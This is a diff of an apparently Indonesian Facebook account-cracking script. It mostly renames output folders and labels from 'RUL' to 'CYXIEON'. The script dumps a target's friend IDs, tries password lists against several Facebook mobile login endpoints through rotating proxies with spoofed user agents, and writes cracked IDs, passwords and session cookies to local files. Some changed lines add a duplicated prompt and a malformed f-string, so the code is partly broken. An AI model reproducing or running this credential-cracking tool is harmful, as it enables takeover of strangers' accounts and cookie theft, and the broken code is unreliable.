@@ -265,6 +265,7 @@ def menu():
 	prints(panel(f"""[white][[cyan]01[white]] Crack Publik [[green]ON[white]] \n[[cyan]02[white]] Crack Massal [white][[green]ON[white]] \n[[cyan]03[white]] Result Cp [[green]ON[white]]\n[[cyan]04[white]] Result Ok [white][[green]ON[white]] \n[[cyan][red]00[white]] logout [white][[red]ngapus kokie[white]] [[green]ON[white]] """,width=43,title=f"[[green] MENU HIDANGAN [/]]",style=f"bold green"))
 	print(f"{kun}╭────────────────────────────────────────────{puti}")
 	CYXIEON_GANTENG = input(f'{hijo}└──[{puti} Input menu : ')
+	CYXIEON_GANTENG = input(f'{kun}└──[{puti} Input menu : ')
 	if CYXIEON_GANTENG in ['01','1']:
 	        idt = input('\n└──[ ID Target : ')
 	        dump(idt,"",{"cookie":cok},token)
@@ -275,10 +276,10 @@ def menu():
 	        hasil_cp()
 	elif CYXIEON_GANTENG in ['04','4']:
 	        hasil_ok()
-	elif CYXIEON_GANTENG in ['00','0']:
+	elif CYXIEON_GANTENG in ['05','5']:
             ganti_cokies()
 
-###-----[ DUMP PUBLIK ]-----###
+#
 def dump_massal():
 	try:
 		token = open('.token.txt','r').read()
@@ -329,7 +330,7 @@ def dump_massal():
 	    except requests.exceptions.ConnectionError:
 	        exit()
 	try:
-	      prints(panel(f" lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green] RulRecoder [/]]",style=f"bold white"))
+	      prints(panel(f"…⁠ᘛ⁠⁐̤⁠ᕐ⁠ᐷ lagi mengumpulkan id, telah sukses mengumpulkan [green]{len(id)}[white] id....",title=f"[[green] RulRecoder [/]]",style=f"bold white"))
 	      atur_id()
 	except requests.exceptions.ConnectionError:
 	    exit()
@@ -370,9 +371,10 @@ def dump(idt,fields,cookie,token):
 		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
 	except:pass
 	      
+
 #----------[ HASIL-OK ]----------#            
 def hasil_ok():
-	try:vin = os.listdir('RUL-OK')
+	try:vin = os.listdir('CYXIEON-OK')
 	except FileNotFoundError:
 		print(f"{kun}╭────────────────────────────────────────────{puti}")
 		exit(f"{kun}└──[{mer} File tidak di temukan ")
@@ -384,7 +386,7 @@ def hasil_ok():
 		cih = 0
 		lol = {}
 		for isi in vin:
-			try:hem = open('RUL-OK/'+isi,'r').readlines()
+			try:hem = open('CYXIEON-OK/'+isi,'r').readlines()
 			except:continue
 			cih+=1
 			if cih<100:
@@ -401,7 +403,7 @@ def hasil_ok():
 		except KeyError:
 		    print(f"{kun}╭────────────────────────────────────────────{puti}")
 		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
-		try:lin = open('RUL-OK/'+geh,'r').read().splitlines()
+		try:lin = open('CYXIEON-OK/'+geh,'r').read().splitlines()
 		except:
 		    print(f"{kun}╭────────────────────────────────────────────{puti}")
 		    exit(f"{kun}└──[{mer} File tidak di temukan ")
@@ -419,7 +421,7 @@ def hasil_ok():
 
 #----------[ HASIL-CP]----------#            
 def hasil_cp():
-	try:vin = os.listdir('RUL-CP')
+	try:vin = os.listdir('CYXIEON-CP')
 	except FileNotFoundError:
 		print(f"{kun}╭────────────────────────────────────────────{puti}")
 		exit(f"{kun}└──[{mer} File tidak di temukan ")
@@ -431,7 +433,7 @@ def hasil_cp():
 		cih = 0
 		lol = {}
 		for isi in vin:
-			try:hem = open('RUL-CP/'+isi,'r').readlines()
+			try:hem = open('CYXIEON-CP/'+isi,'r').readlines()
 			except:continue
 			cih+=1
 			if cih<100:
@@ -448,7 +450,7 @@ def hasil_cp():
 		except KeyError:
 		    print(f"{kun}╭────────────────────────────────────────────{puti}")
 		    exit(f"{kun}└──[{mer} Pilih yang bener :-( ")
-		try:lin = open('RUL-CP/'+geh,'r').read().splitlines()
+		try:lin = open('CYXIEON-CP/'+geh,'r').read().splitlines()
 		except:
 		    print(f"{kun}╭────────────────────────────────────────────{puti}")
 		    exit(f"{kun}└──[{mer} File tidak di temukan ")
@@ -475,8 +477,8 @@ def atur_id():
 def atur_method():
 	print("")
 	print(f'{kun}└──[{puti} 01. m.prod.facebook.com [{hijo}Validate{puti}] ')
-	print(f'{kun}└──[{puti} 02. m.facebook.com [{hijo}Reguler{puti}] ')
-	print(f'{kun}└──[{puti} 03. mbasic.facebook.com [{hijo}Asyinc{puti}] ')      
+	print(f'{kun}└──[{puti} 02. m.facebook.com [{kun}Reguler{puti]} ')
+	print(f'{kun}└──[{puti} 03. mbasic.facebook.com [{mer}Asyinc{puti}] ')      
 	print(f"{kun}╭────────────────────────────────────────────{puti}") 
 	CYXIEON_METHODE = input(f'{kun}└──[{puti} Input method : ')
 	if CYXIEON_METHODE in ['1','01']:
@@ -579,11 +581,11 @@ def crackvalidate(idf,pwx,url):
 	rr = random.randint
 	rc = random.choice
 	emot = rc(["🥸",])
-	prog.update(des,description=f"\r {emot}(RulRecoder)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
+	prog.update(des,description=f"\r {emot}(Validate)(%sOK:{ok}%s)(%sCP:{cp}%s)(%s {loop}%s)"%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
-			ua = rc(ugen)
+			ua = iphone()
 			#ua2 = ("Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59")
 			link = ses.get("https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
 			date = (
@@ -636,15 +638,15 @@ def crackvalidate(idf,pwx,url):
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
 				print(f'{hijo}{ua}')
-				open('RUL-OK/'+'RUL-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
-				open('RUL-OK/'+'RUL-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
+				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f'{kun}{ua}')
-				open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
 				cp+=1
@@ -663,7 +665,7 @@ def crackreguler(idf,pwx,url):
 	rr = random.randint
 	rc = random.choice
 	emot = rc(["😝","😜","🤪"])
-	prog.update(des,description=f"\r {emot} (RulRecoder) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
+	prog.update(des,description=f"\r {emot} ( REGULER ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
 	prog.advance(des)
 	for pw in pwx:
 		try:
@@ -671,8 +673,7 @@ def crackreguler(idf,pwx,url):
 			open('socks4.txt','w').write(proxs)
 			nip = rc(proxs)
 			proxs = {'http': 'socks5://'+nip}
-			ua = rc(ugen)
-			ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"]) 		
+			ua = iphone()
 			ses.headers.update(
 			{
 			"Host":url,
@@ -721,15 +722,15 @@ def crackreguler(idf,pwx,url):
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
 				print(f'{hijo}{ua}')
-				open('RUL-OK/'+'RUL-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
-				open('RUL-OK/'+'RUL-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
+				open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
 				break			
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f"\n⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
 				print(f'{kun}{ua}')
-				open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+				open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 				akune.append(idf+'|'+pw)
 				ceker(idf,pw)
 				cp+=1
@@ -748,7 +749,7 @@ def crackasyinc(idf,pwx):
   rr = random.randint
   rc = random.choice
   emot = rc(["😝","😜","🤪"])
-  prog.update(des,description=f"\r {emot} (RulRecoder) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
+  prog.update(des,description=f"\r {emot} ( ASYINC ) (%s OK : {ok} %s) (%s CP : {cp} %s) (%s {loop} %s) "%(hijo,puti,kun,puti,hijo,puti))
   prog.advance(des)
   for pw in pwx:
     try:
@@ -808,8 +809,8 @@ def crackasyinc(idf,pwx):
         tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
         print(f"{kun}╰────────────────────────────╯{puti}")
         prints(tree)
-        open('RUL-OK/'+'RUL-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
-        open('RUL-OK/'+'RUL-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
+        open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
+        open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
         break	
       elif "checkpoint" in po.cookies.get_dict().keys():
         print(f"{kun}╭────────────────────────────╮{puti}")
@@ -818,7 +819,7 @@ def crackasyinc(idf,pwx):
         tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
         print(f"{kun}╰────────────────────────────╯{puti}")
         prints(tree)
-        open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+        open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
         akune.append(idf+'|'+pw)
         ceker(idf,pw)
         cp+=1
@@ -878,7 +879,7 @@ def ceker(idf,pw):
 			tree = Tree("")
 			tree.add(f"{hijo}Tapyes / A2f ( cek di mbasic ){puti}")
 			prints(tree)
-			#open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+			#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 			#cp+=1
 		else:
 			for opsii in opsi:
@@ -888,16 +889,15 @@ def ceker(idf,pw):
 		tree.add(f"{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}")
 		tree.add(f"{mer}spam ip tidak dapat cek ops{puti}i")
 		prints(tree)
-		#open('RUL-CP/'+'RUL-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
+		#open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
 		#cp+=1
 		
 #----------[ SYSTEM-CONTROL ]----------#	
 if __name__=='__main__':
 	try:os.system('git pull')
 	except:pass
-	try:os.mkdir('RUL-OK')
+	try:os.mkdir('CYXIEON-OK')
 	except:pass
-	try:os.mkdir('RUL-CP')
+	try:os.mkdir('CYXIEON-CP')
 	except:pass
 	menu()
-	
